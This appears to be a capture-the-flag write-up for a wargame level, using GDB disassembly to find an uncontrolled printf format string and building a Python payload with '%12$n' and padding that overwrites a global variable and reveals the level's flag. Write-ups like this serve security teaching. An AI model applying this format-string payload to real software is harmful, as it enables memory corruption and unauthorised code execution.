Let's run `GDB`:
``` shell
$ gdb level4 
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:  push   ebp
   0x080484a8 <+1>:  mov    ebp,esp
   0x080484aa <+3>:  and    esp,0xfffffff0
   0x080484ad <+6>:  call   0x8048457 <n>
   0x080484b2 <+11>: leave  
   0x080484b3 <+12>: ret    
End of assembler dump.
(gdb) disas n   
Dump of assembler code for function n:
   0x08048457 <+0>:  push   ebp
   0x08048458 <+1>:  mov    ebp,esp
   0x0804845a <+3>:  sub    esp,0x218
   0x08048460 <+9>:  mov    eax,ds:0x8049804
   0x08048465 <+14>: mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>: mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>: lea    eax,[ebp-0x208]
   0x08048477 <+32>: mov    DWORD PTR [esp],eax
   0x0804847a <+35>: call   0x8048350 <fgets@plt>
   0x0804847f <+40>: lea    eax,[ebp-0x208]
   0x08048485 <+46>: mov    DWORD PTR [esp],eax
   0x08048488 <+49>: call   0x8048444 <p>
   0x0804848d <+54>: mov    eax,ds:0x8049810
   0x08048492 <+59>: cmp    eax,0x1025544
   0x08048497 <+64>: jne    0x80484a5 <n+78>
   0x08048499 <+66>: mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>: call   0x8048360 <system@plt>
   0x080484a5 <+78>: leave  
   0x080484a6 <+79>: ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:  push   ebp
   0x08048445 <+1>:  mov    ebp,esp
   0x08048447 <+3>:  sub    esp,0x18
   0x0804844a <+6>:  mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:  mov    DWORD PTR [esp],eax
   0x08048450 <+12>: call   0x8048340 <printf@plt>
   0x08048455 <+17>: leave  
   0x08048456 <+18>: ret    
End of assembler dump.
```

The program reads from `stdin` from to a buffer of size 512:
```
   0x08048460 <+9>:  mov    eax,ds:0x8049804
   0x08048465 <+14>: mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>: mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>: lea    eax,[ebp-0x208]
   0x08048477 <+32>: mov    DWORD PTR [esp],eax
   0x0804847a <+35>: call   0x8048350 <fgets@plt>
```

Then this buffer gets passed to `p` function:
```
   0x0804847f <+40>: lea    eax,[ebp-0x208]
   0x08048485 <+46>: mov    DWORD PTR [esp],eax
   0x08048488 <+49>: call   0x8048444 <p>
```

And this function prints uses this buffer as first argument for `printf`:
```
   0x0804844a <+6>:  mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:  mov    DWORD PTR [esp],eax
   0x08048450 <+12>: call   0x8048340 <printf@plt>
```

After the call to `p` variable at `ds:0x8049810` is evaluated and checked for value `0x1025544`:
```
   0x0804848d <+54>: mov    eax,ds:0x8049810
   0x08048492 <+59>: cmp    eax,0x1025544
```

What we need to do is to somehow modify value at address `0x8049810`.

Because in the function `p` the buffer is passed as a first argument, we can utilize the printf format exploit.
The idea is that we can use printf's feature `%n` to output a number into desired adrress.

Firstly, let's try to pass the address as parameter.
To do this we should create a string that start with the address.
This way printf can access this address because it lies on the stack (because the buffer is on the stack).

Let's use a Python script for generating a string for the exploit:
``` python
import struct

target_address = 0x8049810

out = ''

out += struct.pack('I', target_address)
out += '[%x]' * 20

print(out)
```
``` shell
(gdb) r < /tmp/exploit_payload 
Starting program: /home/user/level4/level4 < /tmp/exploit_payload
[b7ff26b0][bffff754][b7fd0ff4][0][0][bffff718][804848d][bffff510][200][b7fd1ac0][b7ff37d0][8049810][5d78255b][5d78255b][5d78255b][5d78255b][5d78255b][5d78255b][5d78255b][5d78255b]
[Inferior 1 (process 9044) exited normally]
```

As we can see the address is on 12th position.
We can simplify the script:
``` python
import struct

target_address = 0x8049810

out = ''

out += struct.pack('I', target_address)
out += '[%12$x]'

print(out)
```
``` shell
(gdb) r < /tmp/exploit_payload 
Starting program: /home/user/level4/level4 < /tmp/exploit_payload
[8049810]
[Inferior 1 (process 9049) exited normally]
```

Now it time for `%n`.
Let's try to write any value at `0x8049810`:
``` python
import struct

target_address = 0x8049810

out = ''

out += struct.pack('I', target_address)
out += '%12$n'

print(out)
```
``` shell
(gdb) br *0x08048455
(gdb) r < /tmp/exploit_payload 
Starting program: /home/user/level4/level4 < /tmp/exploit_payload
[]

Breakpoint 1, 0x08048455 in p ()
(gdb) x/wx 0x8049810
0x8049810 <m>: 0x00000003
```

This works.
Let's now generate final string.
For this we have to write exactly 16930116 characters.
Let's make printf to pad out parameer with vast of spaces:
``` python
import struct

target_address = 0x8049810

out = ''

out += struct.pack('I', target_address)
out += '%16930112x%12$n'

print(out)
```
``` shell
(gdb) br *0x08048455
(gdb) r < /tmp/exploit_payload 
Starting program: /home/user/level4/level4 < /tmp/exploit_payload
...
(gdb) x/wx 0x8049810
0x8049810 <m>: 0x01025544
```

Finally:
``` shell
$ cat /tmp/exploit_payload | ./level4 
... 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
